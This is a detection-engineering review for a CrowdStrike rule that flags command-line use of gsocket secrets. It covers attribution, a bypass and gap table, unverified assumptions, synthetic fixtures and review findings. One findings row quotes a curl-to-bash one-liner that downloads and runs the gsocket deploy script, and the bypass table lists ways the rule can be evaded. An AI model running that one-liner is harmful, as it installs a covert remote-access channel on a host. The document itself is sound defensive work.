# REVIEW - DAC-CS-0247 Falcon: gsocket secret passed on the command line (GS_ARGS, deploy notify vars, or gs-* tool with -s/-k)

## Attribution
Clean-room behavioural rule written from public sources opened on 12 Nov 2026 (IST):
- https://www.microsoft.com/en-us/security/blog/2026/11/11/global-socket-how-threat-actors-weaponizing-gsocket-stealthy-c2/
- https://github.com/hackerschoice/gsocket/blob/master/deploy/deploy.sh
- https://github.com/hackerschoice/gsocket/blob/master/README.md
- https://attack.mitre.org/techniques/T1219/
- https://attack.mitre.org/techniques/T1090/002/
- https://github.com/CrowdStrike/logscale-community-content

The Microsoft blog's own hunting queries match tool names, hosts, hashes and fixed file names. This rule does not copy them and does not use any IOC as its trigger. No detections.ai content, no employer data, no CrowdStrike console data. Fixtures are synthetic.

## As-is (new)
No rule in this repo matched this behaviour on main at 9a7a7d9 (searched for gsocket, exec -a, GS_ARGS, hidden temp-path execution and touch timestamp options).

## After
New crowdstrike rule DAC-CS-0247 on ProcessRollup2 (event_platform=Lin). Companion: DAC-MDE-0098.

## ATT&CK v19.2
Checked against enterprise-attack-19.2.json: T1219, T1090.002; tactics command-and-control.

## Existing overlap in this repo
None found.

## Bypass / gap table
| Bypass | Why | Mitigation / status |
|---|---|---|
| Renamed gs-netcat with secret in a file and no GS_ARGS on the command line | Nothing gsocket-specific left | Covered in part by the kernel-name and hidden-path rules |
| Variables exported in a script | Not on the command line | Known gap |
| Custom builds with other variable names | Name list | Known gap |

## Unverified
- The env vars are only visible when set inline inside a sh -c or bash -c string. A binary started by a process that exported them earlier shows nothing.
- Whether systemd ExecStart children show the full bash -c string in CommandLine on both sensors.
- Field names come from logscale-community-content Linux queries (ProcessRollup2, event_platform=Lin, UID, ParentBaseFileName, GrandParentBaseFileName, ImageFileName, CommandLine); query not run in LogScale.
- telemetry_validated false.

## Tests
Synthetic fixtures under tests/cases/DAC-CS-0247/. Each has `"synthetic": true` and `result` "not run". There is no LogScale or Advanced Hunting runner here. As a supplement, the rule's regexes were mirrored in Python and applied to the fixture events. That checks the patterns only, not the query language.

| Fixture | Expect alert | Regex check | Result |
|---|---|---|---|
| malicious_0 | yes | would alert | match |
| malicious_1 | yes | would alert | match |
| malicious_2 | yes | would alert | match |
| benign_3 | no | no alert | match |
| near_miss_4 | no | no alert | match |

## Ponytail findings (applied before PR)
| # | Sev | Finding | Failing input | Fix applied |
|---|---|---|---|---|
| 1 | Must | Draft matched any GS_*= variable and fired on Ghostscript | `sh -c GS_OPTIONS=-dSAFER gs ... (benign_3)` | Named variables only: GS_ARGS, GSOCKET_ARGS and the deploy notify vars |
| 2 | Must | IOC host as trigger is not allowed by the brief | `bash -c "$(curl -fsSL https://gsocket.io/y)" with no GS_ var` | gsocket.io is a supporting field only; trigger is the env var or gs-* -s/-k |
| 3 | Should | Docs lookup mentioning GSOCKET_ARGS | `grep -n GSOCKET_ARGS README.md (near_miss_4)` | Require = after the name |

## Reviewer status
pending
